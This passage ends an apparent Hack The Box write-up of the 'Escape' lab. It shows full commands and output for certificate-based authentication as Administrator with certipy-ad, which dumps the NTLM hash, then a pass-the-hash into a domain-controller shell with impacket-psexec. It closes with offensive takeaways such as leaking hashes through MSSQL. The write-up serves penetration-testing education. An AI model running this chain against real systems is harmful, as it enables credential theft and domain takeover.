To accomplish this we first must calculate the level of skew we are off from the server. As you can see, we are about 4 hours and 4 (ish) minutes ahead of the server time. Since we only need to be within five minutes we can just use the time output from the `date` query and it should get us within range.

```zsh
┌──(kali㉿kali)-[~/…/HTB/escape/files/bloodhound]
└─$ faketime -f '2026-08-29 02:50:25.629733' certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.98.207 -domain sequel.htb -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.98.207'
[+] DC IP: '10.129.98.207'
[+] DC Host: ''
[+] Target IP: '10.129.98.207'
[+] Remote Name: '10.129.98.207'
[+] Domain: ''
[+] Username: ''
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[+] Found SID in SAN URL: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC sequel.htb (10.129.98.207)
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[+] Attempting to write data to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[+] Data written to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:**a52f78e4c751e5f5e17e1e9f3e58f4ee**
```
We successfully obtain the `Administrator` user's ccache credential and raw NTLM hash which we can use to pass-the-hash if we want.

```zsh
┌──(kali㉿kali)-[~/…/HTB/escape/files/bloodhound]
└─$ impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee' sequel.htb/administrator@sequel.htb -dc-ip 10.129.98.207
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file vUhojXcL.exe
[*] Opening SVCManager on sequel.htb.....
[*] Creating service DTty on sequel.htb.....
[*] Starting service DTty.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```
Successfully abused pass-the-hash with `impacket-psexec` to get a shell as `Administrator` on the DC. Pwned.


## Final Thoughts
>[!Takeaways]
>- When enumerating an MSSQL db always try and get it to reach back out to an attacker controlled SMB server to see if you can leak a hash that way
>- Enumerate tf out of the local file system. There's almost always secrets lying around. Be sure to start at the base directory and work down making sure to give extra care to files pertaining to your current user.
>- Bloodhound won't always pull accurate certificate data. Best to enumerate that separately with `certipy-ad`.
>- `faketime` is your friend for clockskew. Just query the target with `ntpdate -q ` and set your time manually to whatever the output is



